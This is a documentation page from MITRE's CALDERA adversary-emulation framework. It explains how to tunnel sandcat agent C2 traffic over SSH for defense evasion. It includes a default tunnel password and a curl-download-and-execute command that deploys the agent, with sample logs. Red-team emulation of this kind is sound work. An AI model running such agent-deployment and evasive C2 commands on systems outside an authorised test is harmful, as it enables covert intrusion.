

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>C2 Communications Tunneling &mdash; caldera  documentation</title>
  

  
  
  
  

  
  <script type="text/javascript" src="_static/js/modernizr.min.js"></script>
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
        <script src="_static/jquery.js"></script>
        <script src="_static/underscore.js"></script>
        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="_static/doctools.js"></script>
    
    <script type="text/javascript" src="_static/js/theme.js"></script>

    

  
  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Search" href="search.html" />
    <link rel="next" title="Uninstall CALDERA" href="Uninstalling-CALDERA.html" />
    <link rel="prev" title="Peer-to-Peer Proxy Functionality for Sandcat Agents" href="Sandcat-Peer-to-Peer.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="index.html">
          

          
            
            <img src="_static/caldera-logo.png" class="logo" alt="Logo"/>
          
          </a>

          
            
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption" role="heading"><span class="caption-text">Usage Guides</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="Installing-CALDERA.html">Installing CALDERA</a></li>
<li class="toctree-l1"><a class="reference internal" href="Getting-started.html">Getting started</a></li>
<li class="toctree-l1"><a class="reference internal" href="Learning-the-terminology.html">Learning the terminology</a></li>
<li class="toctree-l1"><a class="reference internal" href="Basic-Usage.html">Basic Usage</a></li>
<li class="toctree-l1"><a class="reference internal" href="Server-Configuration.html">Server Configuration</a></li>
<li class="toctree-l1"><a class="reference internal" href="Plugin-library.html">Plugin library</a></li>
<li class="toctree-l1"><a class="reference internal" href="Parsers.html">Parsers</a></li>
<li class="toctree-l1"><a class="reference internal" href="Relationships.html">Relationships</a></li>
<li class="toctree-l1"><a class="reference internal" href="Requirements.html">Requirements</a></li>
<li class="toctree-l1"><a class="reference internal" href="Objectives.html">Objectives</a></li>
<li class="toctree-l1"><a class="reference internal" href="Operation-Results.html">Operation Results</a></li>
<li class="toctree-l1"><a class="reference internal" href="Initial-Access-Attacks.html">Initial Access Attacks</a></li>
<li class="toctree-l1"><a class="reference internal" href="Lateral-Movement-Guide.html">Windows Lateral Movement Guide</a></li>
<li class="toctree-l1"><a class="reference internal" href="Dynamically-Compiled-Payloads.html">Dynamically-Compiled Payloads</a></li>
<li class="toctree-l1"><a class="reference internal" href="Exfiltration.html">Exfiltration</a></li>
<li class="toctree-l1"><a class="reference internal" href="Sandcat-Peer-to-Peer.html">Peer-to-Peer Proxy Functionality for Sandcat Agents</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">C2 Communications Tunneling</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#ssh-tunneling">SSH Tunneling</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#usage-serverside">Usage - Serverside</a></li>
<li class="toctree-l3"><a class="reference internal" href="#usage-agent">Usage - Agent</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="Uninstalling-CALDERA.html">Uninstall CALDERA</a></li>
<li class="toctree-l1"><a class="reference internal" href="Troubleshooting.html">Troubleshooting</a></li>
<li class="toctree-l1"><a class="reference internal" href="resources.html">Resources</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Plugin Documentation</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="plugins/sandcat/Sandcat-Details.html">Sandcat Plugin Details</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html">Exfiltration Scenarios and Setup</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#an-example">An Example</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#wrap-up">Wrap-up</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Developer Information</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="The-REST-API.html">The REST API</a></li>
<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Plugins.html">How to Build Plugins</a></li>
<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Planners.html">How to Build Planners</a></li>
<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Agents.html">How to Build Agents</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Core System API</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="_generated/modules.html">app</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="index.html">caldera</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="index.html">Docs</a> &raquo;</li>
        
      <li>C2 Communications Tunneling</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="_sources/C2-Tunneling.md.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="c2-communications-tunneling">
<h1>C2 Communications Tunneling<a class="headerlink" href="#c2-communications-tunneling" title="Permalink to this heading">¶</a></h1>
<p>In addition to built-in contact methods such as HTTP, DNS, TCP, and UDP, CALDERA also provides support for tunneling C2 traffic, which supporting agents can use to mask built-in contact methods for added defense evasion.
Currently, the only available tunneling method is SSH tunneling, which is only supported by the sandcat agent.</p>
<div class="section" id="ssh-tunneling">
<h2>SSH Tunneling<a class="headerlink" href="#ssh-tunneling" title="Permalink to this heading">¶</a></h2>
<p>Sandcat agents can use SSH tunneling to tunnel C2 contact mechanisms, namely HTTP(S). CALDERA also provides built-in support to spin up a minimal local SSH server for SSH tunneling.</p>
<div class="section" id="usage-serverside">
<h3>Usage - Serverside<a class="headerlink" href="#usage-serverside" title="Permalink to this heading">¶</a></h3>
<p>Within the CALDERA configuration file, adjust the following entries according to your environment:</p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.host_key_file</span></code>: File name for the server’s SSH private host key. You can generate your own SSH private host key for the CALDERA server. The file must reside in the <code class="docutils literal notranslate"><span class="pre">conf/ssh_keys</span></code> directory. If the CALDERA server cannot find or read the provided private host key, it will generate a temporary RSA host key to use for operations. Although this would cause security warnings under normal circumstances, the sandcat agent implementation of SSH tunneling does not attempt to verify hosts, and thus should not be affected by changing or temporary host keys.</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.host_key_passphrase</span></code>: Passphrase for the server’s SSH private host key. The server will use this passphrase to read the private host key file provided in <code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.host_key_file</span></code>.</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.socket</span></code>: Indicates the IP address and port that the CALDERA server will listen on for SSH tunneling connections (e.g. <code class="docutils literal notranslate"><span class="pre">0.0.0.0:8022</span></code>).</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.user_name</span></code>: User name that agents will use to authenticate to the CALDERA server via SSH. The default value is <code class="docutils literal notranslate"><span class="pre">sandcat</span></code>.</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.user_password</span></code>: Password that agents will use to authenticate to the CALDERA server via SSH. The default value is <code class="docutils literal notranslate"><span class="pre">s4ndc4t!</span></code>.</p></li>
</ul>
<p>Once the configuration entries are set, simply start the CALDERA server up as normal via the <code class="docutils literal notranslate"><span class="pre">server.py</span></code> Python program, and CALDERA will automatically attempt to start an SSH server that listens on the specified socket (<code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.socket</span></code>).</p>
<p>The contact will first attempt to read in the host private key file specified by <code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.host_key_file</span></code>, using the passphrase specified by <code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.host_key_passphrase</span></code>. If it cannot read the file for whatever reason (e.g. file does not exist, or the passphrase is incorrect), then the server will generate its own temporary private key to use for the server.</p>
<p>The SSH server should only be used between agents and the C2 server and should not be used to SSH into the CALDERA server manually (e.g. to manage the server remotely).</p>
</div>
<div class="section" id="usage-agent">
<h3>Usage - Agent<a class="headerlink" href="#usage-agent" title="Permalink to this heading">¶</a></h3>
<p>The sandcat agent is currently the only agent that supports SSH tunneling. To use it, the <code class="docutils literal notranslate"><span class="pre">server</span></code>, <code class="docutils literal notranslate"><span class="pre">tunnelProtocol</span></code>, <code class="docutils literal notranslate"><span class="pre">tunnelAddr</span></code>, <code class="docutils literal notranslate"><span class="pre">tunnelUser</span></code>, and <code class="docutils literal notranslate"><span class="pre">tunnelPassword</span></code> arguments must be used.</p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">server</span></code> value is the CALDERA server endpoint that the tunnel will connect to - if the agent is tunneling HTTP communications through SSH, then <code class="docutils literal notranslate"><span class="pre">server</span></code> should be the HTTP socket for the CALDERA C2 server (e.g. <code class="docutils literal notranslate"><span class="pre">http://10.10.10.15:8888</span></code>).</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">tunnelProtocol</span></code> value is the name of the tunneling mechanism that the agent is using. For SSH, the value must be <code class="docutils literal notranslate"><span class="pre">SSH</span></code>.</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">tunnelAddr</span></code> is the port number or IP:port combination that indicates which port or socket to connect to via SSH to start the tunnel (e.g. <code class="docutils literal notranslate"><span class="pre">8022</span></code> or <code class="docutils literal notranslate"><span class="pre">10.10.10.15:8022</span></code>). If only a port number is provided, the agent will try to connect to the IP address from <code class="docutils literal notranslate"><span class="pre">server</span></code> using the specified port. The server listening on the port/socket should be listening for SSH connections from agents.</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">tunnelUser</span></code> indicates which username to use to authenticate to <code class="docutils literal notranslate"><span class="pre">tunnelAddr</span></code> via SSH. This username should match the CALDERA configuration value for <code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.user_name</span></code>.</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">tunnelPassword</span></code> indicates which password to use to authenticate to
<code class="docutils literal notranslate"><span class="pre">tunnelAddr</span></code> via SSH. This password should match the CALDERA configuration value for <code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.user_password</span></code>.</p></li>
</ul>
<p>To tunnel different contacts through SSH tunneling, simply adjust the <code class="docutils literal notranslate"><span class="pre">c2</span></code> and <code class="docutils literal notranslate"><span class="pre">server</span></code> values as needed.</p>
<p>When authenticating to the provided SSH server, the sandcat agent will use the username/password provided by the <code class="docutils literal notranslate"><span class="pre">tunnelUser</span></code> and <code class="docutils literal notranslate"><span class="pre">tunnelPassword</span></code> arguments. Whatever credentials the agent uses must reflect the CALDERA configuration values specified in <code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.user_name</span></code> and <code class="docutils literal notranslate"><span class="pre">app.contact.tunnel.ssh.user_password</span></code>. The agent will then open a random local port to act as the local endpoint of the SSH tunnel. This local endpoint becomes the <code class="docutils literal notranslate"><span class="pre">upstream_dest</span></code> value for the agent.</p>
<p>The following commandline will start a sandcat agent that will open up an SSH tunnel to the CALDERA c2 server at <code class="docutils literal notranslate"><span class="pre">192.168.140.1:8022</span></code>, and the tunneled communications will be sent to the c2 server’s HTTP endpoint at <code class="docutils literal notranslate"><span class="pre">192.168.140.1:8888</span></code>:</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">server</span><span class="o">=</span><span class="s2">&quot;http://192.168.140.1:8888&quot;</span><span class="p">;</span>
curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;file:sandcat.go&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;platform:linux&quot;</span><span class="w"> </span><span class="nv">$server</span>/file/download<span class="w"> </span>&gt;<span class="w"> </span>sandcat.go<span class="p">;</span>
chmod<span class="w"> </span>+x<span class="w"> </span>sandcat.go<span class="p">;</span>
./sandcat.go<span class="w"> </span>-server<span class="w"> </span><span class="nv">$server</span><span class="w"> </span>-v<span class="w"> </span>-tunnelProtocol<span class="w"> </span>SSH<span class="w"> </span>-tunnelAddr<span class="w"> </span><span class="m">8022</span><span class="w"> </span>-tunnelUser<span class="w"> </span>sandcat<span class="w"> </span>-tunnelPassword<span class="w"> </span>s4ndc4t!
</pre></div>
</div>
<p>The above Linux agent will produce verbose output similar to the following:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SStarting</span> <span class="n">sandcat</span> <span class="ow">in</span> <span class="n">verbose</span> <span class="n">mode</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">SSH</span> <span class="n">tunnel</span>
<span class="n">Starting</span> <span class="n">local</span> <span class="n">tunnel</span> <span class="n">endpoint</span> <span class="n">at</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">52649</span>
<span class="n">Setting</span> <span class="n">server</span> <span class="n">tunnel</span> <span class="n">endpoint</span> <span class="n">at</span> <span class="mf">192.168.140.1</span><span class="p">:</span><span class="mi">8022</span>
<span class="n">Setting</span> <span class="n">remote</span> <span class="n">endpoint</span> <span class="n">at</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">8888</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Listening</span> <span class="n">on</span> <span class="n">local</span> <span class="n">SSH</span> <span class="n">tunnel</span> <span class="n">endpoint</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SSH</span> <span class="n">tunnel</span> <span class="n">ready</span> <span class="ow">and</span> <span class="n">listening</span> <span class="n">on</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mf">52649.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="nb">set</span> <span class="n">channel</span> <span class="n">HTTP</span>
<span class="n">Beacon</span> <span class="n">API</span><span class="o">=/</span><span class="n">beacon</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Set</span> <span class="n">communication</span> <span class="n">channel</span> <span class="n">to</span> <span class="n">HTTP</span>
<span class="n">initial</span> <span class="n">delay</span><span class="o">=</span><span class="mi">0</span>
<span class="n">server</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.140.1</span><span class="p">:</span><span class="mi">8888</span>
<span class="n">upstream</span> <span class="n">dest</span> <span class="n">addr</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">52649</span>
<span class="n">group</span><span class="o">=</span><span class="n">red</span>
<span class="n">privilege</span><span class="o">=</span><span class="n">User</span>
<span class="n">allow</span> <span class="n">local</span> <span class="n">p2p</span> <span class="n">receivers</span><span class="o">=</span><span class="n">false</span>
<span class="n">beacon</span> <span class="n">channel</span><span class="o">=</span><span class="n">HTTP</span>
<span class="n">Local</span> <span class="n">tunnel</span> <span class="n">endpoint</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">52649</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Accepted</span> <span class="n">connection</span> <span class="n">on</span> <span class="n">local</span> <span class="n">SSH</span> <span class="n">tunnel</span> <span class="n">endpoint</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Listening</span> <span class="n">on</span> <span class="n">local</span> <span class="n">SSH</span> <span class="n">tunnel</span> <span class="n">endpoint</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Forwarding</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">server</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opened</span> <span class="n">remote</span> <span class="n">connection</span> <span class="n">through</span> <span class="n">tunnel</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Beacon</span> <span class="p">(</span><span class="n">HTTP</span><span class="p">):</span> <span class="n">ALIVE</span>
</pre></div>
</div>
<p>The agent connected to the C2 server via SSH at <code class="docutils literal notranslate"><span class="pre">192.168.140.1:8022</span></code> and opened a local SSH tunnel on local port 52649 that tunnels HTTP traffic to the C2 server at <code class="docutils literal notranslate"><span class="pre">192.168.140.1:8888</span></code>. This is the equivalent of running <code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">-L</span> <span class="pre">52649:localhost:8888</span> <span class="pre">sandcat&#64;192.168.140.1</span> <span class="pre">-p</span> <span class="pre">8022</span> <span class="pre">-N</span></code>.</p>
<p>Note that the agent’s upstream destination endpoint is set to the local SSH tunnel endpoint at <code class="docutils literal notranslate"><span class="pre">http://localhost:54351</span></code> (the protocol is set to <code class="docutils literal notranslate"><span class="pre">http</span></code> since the agent is tunneling HTTP comms), while the true server value is the final tunnel destination at <code class="docutils literal notranslate"><span class="pre">http://192.168.140.1:8888</span></code>.</p>
<p>If running the CALDERA c2 server with logging verbosity set to <code class="docutils literal notranslate"><span class="pre">DEBUG</span></code>, you may see output similar to the following when an agent connects via SSH tunneling:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">INFO</span>  <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Accepted</span> <span class="n">SSH</span> <span class="n">connection</span> <span class="n">on</span> <span class="mf">192.168.140.1</span><span class="p">,</span> <span class="n">port</span> <span class="mi">8022</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">INFO</span>  <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span>   <span class="n">Client</span> <span class="n">address</span><span class="p">:</span> <span class="mf">192.168.140.100</span><span class="p">,</span> <span class="n">port</span> <span class="mi">43796</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">contact_ssh</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">52</span> <span class="n">connection_made</span><span class="p">)</span> <span class="n">SSH</span> <span class="n">connection</span> <span class="n">received</span> <span class="kn">from</span> <span class="mf">192.168.140.100</span><span class="o">.</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">key</span> <span class="n">exchange</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Received</span> <span class="n">key</span> <span class="n">exchange</span> <span class="n">request</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Beginning</span> <span class="n">key</span> <span class="n">exchange</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Completed</span> <span class="n">key</span> <span class="n">exchange</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">INFO</span>  <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Beginning</span> <span class="n">auth</span> <span class="k">for</span> <span class="n">user</span> <span class="n">sandcat</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">password</span> <span class="n">auth</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">INFO</span>  <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Auth</span> <span class="k">for</span> <span class="n">user</span> <span class="n">sandcat</span> <span class="n">succeeded</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">contact_ssh</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">48</span> <span class="n">connection_requested</span><span class="p">)</span> <span class="n">Connection</span> <span class="n">request</span> <span class="kn">from</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span> <span class="n">to</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">8888</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">chan</span><span class="o">=</span><span class="mi">0</span><span class="p">]</span> <span class="n">Set</span> <span class="n">write</span> <span class="n">buffer</span> <span class="n">limits</span><span class="p">:</span> <span class="n">low</span><span class="o">-</span><span class="n">water</span><span class="o">=</span><span class="mi">16384</span><span class="p">,</span> <span class="n">high</span><span class="o">-</span><span class="n">water</span><span class="o">=</span><span class="mi">65536</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">INFO</span>  <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span> <span class="n">Accepted</span> <span class="n">direct</span> <span class="n">TCP</span> <span class="n">connection</span> <span class="n">request</span> <span class="n">to</span> <span class="n">localhost</span><span class="p">,</span> <span class="n">port</span> <span class="mi">8888</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">INFO</span>  <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span>   <span class="n">Client</span> <span class="n">address</span><span class="p">:</span> <span class="mf">0.0.0.0</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">INFO</span>  <span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">79</span> <span class="n">log</span><span class="p">)</span> <span class="p">[</span><span class="n">conn</span><span class="o">=</span><span class="mi">2</span><span class="p">]</span>   <span class="n">Forwarding</span> <span class="n">TCP</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">localhost</span><span class="p">,</span> <span class="n">port</span> <span class="mi">8888</span>
<span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="o">-</span> <span class="n">DEBUG</span> <span class="p">(</span><span class="n">contact_svc</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">64</span> <span class="n">handle_heartbeat</span><span class="p">)</span> <span class="n">First</span> <span class="n">time</span> <span class="n">HTTP</span> <span class="n">beacon</span> <span class="kn">from</span> <span class="nn">kliuok</span>
</pre></div>
</div>
<p>Once the tunnel is established, operators can proceed as normal with agent activity and operations.</p>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="Uninstalling-CALDERA.html" class="btn btn-neutral float-right" title="Uninstall CALDERA" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="Sandcat-Peer-to-Peer.html" class="btn btn-neutral float-left" title="Peer-to-Peer Proxy Functionality for Sandcat Agents" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2023, The MITRE Corporation

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
  
    
   

</body>
</html>